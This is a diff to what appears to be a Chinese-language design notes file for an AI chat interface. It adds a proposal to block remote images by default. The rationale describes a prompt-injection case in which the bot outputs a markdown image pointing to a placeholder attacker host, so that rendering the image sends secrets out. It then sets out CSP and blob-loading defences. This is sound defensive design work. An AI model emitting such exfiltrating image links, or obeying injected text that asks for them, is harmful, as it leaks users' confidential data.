@@ -795,3 +795,14 @@ claude 的 `AskUserQuestion`（網頁或終端答的都一樣）答完之後，�
 - 取消（Cancel／Esc）或沒答的題目寫斜體「沒有回答」；整組都沒答，標頭改成「提問（沒有回答）」。
 - **只讀**：沒有倒回鍵、來源標、送達標、重送入口，不是使用者的 prompt，不碰任何送出或排隊；點一下複製問答純文字。答案用文字節點畫，不解析成 HTML／Markdown。
 - 只有 `id` 以 `ask:` 開頭、`role=system`、`content.type=ask_answers` 的訊息才畫成這張卡；使用者自己打一樣長相的 JSON 仍是使用者泡泡。
+
+## 對話裡的遠端圖片預設不載入（2026-10-01，issue #764，提案分支，等使用者拍板）
+
+bot 會讀外部內容；被 prompt injection 後只要輸出 `![](https://攻擊者/collect?d=機密)`，瀏覽器一渲染就替它把資料送出去。
+
+- **http(s) 圖片先畫佔位、點了才載入**：「🖼 外部圖片（網域）— 載入圖片」；網址帶很長的 query／fragment 或帳密時多一句警告（正常圖片網址很少那樣）。
+  daemon 自己的 `local-image`（專案目錄裡的檔）與 `data:` 圖片（行內資料、不會發請求）照常直接顯示。輸出中的氣泡（`LiveBubble`）與完成的訊息走同一個 `MarkdownImage`。
+- **載入方式＝瀏覽器 `fetch`→blob**（不帶 cookie、不帶 Referer，要 `image/*`、上限 10 MB），失敗就改成「在新分頁開啟」的連結（使用者自己點的連結）。
+  不做 daemon 代理：代理要在使用者機器上替任意網址發請求，得另外擋 SSRF（內網／loopback／DNS rebinding／轉址），攻擊面比這個問題本身還大；代價是對方沒開 CORS 的圖只能新分頁看。
+- **`index.html` 加 CSP `img-src 'self' data: blob:`**：之後新增的渲染路徑就算又用 `<img src="https://…">` 也載不了。CSP 不能對單張放寬，所以「點了才載」必須走 blob，而不是把 `src` 換成網址。
+- 取捨：bot 常貼 GitHub／shields.io 的圖，每張多一次點擊；之後若要「這個網域一律載入」，是使用者設定、而且要寫進 CSP 之外的白名單邏輯（blob 路徑），不能放寬 CSP。
